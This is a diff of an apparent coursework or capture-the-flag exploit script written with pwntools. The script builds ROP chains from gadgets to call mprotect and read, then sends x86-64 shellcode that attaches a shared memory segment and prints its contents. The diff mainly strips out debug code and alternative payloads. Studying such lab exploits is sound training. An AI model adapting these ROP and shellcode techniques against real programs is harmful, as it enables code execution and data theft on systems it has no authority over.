@@ -93,21 +93,6 @@ def get_rop_addr():
     pop_rdx_ret = code_bytes_find(asm("pop rdx\nret")) + start_code_address
 
 
-def exit_37_byte():
-    global start_code_address, pop_rax_ret, pop_rdi_ret, syscall_ret
-
-    send_line = flat(
-        pop_rax_ret,
-        60,
-        pop_rdi_ret,
-        37,
-        syscall_ret,
-        endianness = 'little'
-    )
-
-    return send_line
-
-
 def mprotect_read_byte():
     global start_code_address, pop_rax_ret, pop_rdi_ret, syscall_ret, pop_rsi_ret, pop_rdx_ret
 
@@ -118,7 +103,6 @@ def mprotect_read_byte():
     # 1. open memory = codeint to be able to read & write & execute
     # 2. read user input
     # ropshell will clean the register before executing
-
     send_line = flat(
         # mprotect, syscall number 10
         # rax: syscall number - 10
@@ -291,7 +275,6 @@ def task_3_asm_byte():
     # rsi: write the content from the virtual memory address map to share memory(attach memory segment return from shmat)
     # rdx: count, write 100 byte to stdout and end at null terminator
     
-    # i think is correct
     send_line = asm("""mov rax, 29
         mov rdi, 0x1337
         mov rsi, 200
@@ -309,7 +292,7 @@ def task_3_asm_byte():
         mov rdx, 69
         syscall""")
 
-    # 4. if want to print a reg
+    # 4. if want to print a reg to debug
     # (1) put format string into a place on codeint
     # (2) mov rsi, codeint addr
     # (3) xor rax, rax
@@ -317,47 +300,8 @@ def task_3_asm_byte():
     #       [1] rdi - format string address -> place format string onto a place on codeint
     #       [2] rsi - the value want to insert into format string
 
-    # send_line = asm("""mov rax, 29
-    #     mov rdi, 0x1337
-    #     mov rsi, 200
-    #     mov rdx, 0
-    #     syscall
-
-    #     mov rdi, 0x0a6425203a76
-
-
-    #     mov rdi, rax
-    #     mov rax, 30
-    #     mov rsi, 0
-    #     mov rdx, 0x10000
-    #     syscall
-    #     mov r14, rax
-    #     mov rax, 1
-    #     mov rdi, 1
-    #     mov rsi, r14
-    #     mov rdx, 200
-    #     syscall""")
-
-
-    # send_line = asm("""mov rax, 29
-    #     mov rdi, 0x3713
-    #     mov rsi, 200
-    #     mov rdx, 0
-    #     syscall
-    #     mov rdi, rax
-    #     mov rax, 30
-    #     mov rsi, """ + str(hex(virtual_memory_address)) + """
-    #     mov rdx, 0x010000
-    #     syscall
-    #     mov r14, rax
-    #     mov rax, 1
-    #     mov rdi, 1
-    #     mov rsi, """ + str(hex(virtual_memory_address)) + """
-    #     mov rdx, 200
-    #     syscall""")
-
-    disassembly = disasm(send_line) # Disassemble shellcode
-    print("disassembly:\n", disassembly)
+    # disassembly = disasm(send_line) # Disassemble shellcode
+    # print("disassembly:\n", disassembly)
 
     return send_line
 
@@ -395,37 +339,25 @@ if __name__ == '__main__':
     gen_random_code_bytes()
     get_rop_addr()
 
-    # send_line = exit_37_byte()
     # [first send] -> mprotect & read from user input
     send_line = mprotect_read_byte()
-    # send_line += exit_37_byte()
-    # print("send_line_1: ", send_line)
-
-    # gdb.attach(r)
-    
     r.send(send_line)
-
-    # send shell code -> normal exit
     print("bytes command received output: ", r.recvuntil("bytes command received.\n", drop=False).decode())
 
     # 1st write codeint output
     print(r.recv())
 
-    # [second send] -> input the asm we want to execute and it will be store into the start of codeint
-    # send_line_2 = task_2_asm_byte() + task_3_asm_byte() + exit_0_asm_byte()
-    send_line_2 = task_2_asm_byte() + task_3_asm_byte() + exit_0_asm_byte()
 
+    # [second send] -> input the asm we want to execute and it will be store into the start of codeint
+    send_line_2 = task_2_asm_byte() + task_3_asm_byte() + exit_0_asm_byte()
     print("send_line_2 to read: ", send_line_2)
     r.send(send_line_2)
     print("after send 2 - 1")
 
     # 2nd write codeint output
     print(r.recv())
-
     print("after send 2 - 2")
 
-    # print(r.recvline().decode())
-    # print(r.recvline().decode())    
     # print(r.recvline().decode())    
 
     # 2nd write codeint output
